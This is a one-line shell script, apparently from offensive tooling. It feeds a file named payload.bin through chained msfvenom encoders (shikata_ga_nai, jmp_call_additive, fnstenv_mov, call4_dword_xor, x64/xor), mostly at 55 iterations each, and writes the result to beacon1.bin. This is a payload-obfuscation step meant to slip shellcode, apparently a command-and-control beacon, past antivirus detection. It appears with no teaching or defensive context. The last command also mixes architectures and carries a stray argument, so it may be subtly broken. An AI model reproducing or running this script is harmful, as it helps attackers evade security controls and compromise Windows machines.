#!/bin/sh
cat payload.bin | msfvenom -p - -a x86 --platform Windows -e x86/shikata_ga_nai -i 55 | msfvenom -p - -a x86 --platform Windows -e x86/jmp_call_additive -i 55 | msfvenom -p - -a x86 --platform Windows -e x86/fnstenv_mov -i 55 | msfvenom -p - -a x86 --platform Windows -e x86/call4_dword_xor -i 55 |msfvenom - -p - -a x64 --platform Windows -e x64/xor -i 3 -f raw > beacon1.bin

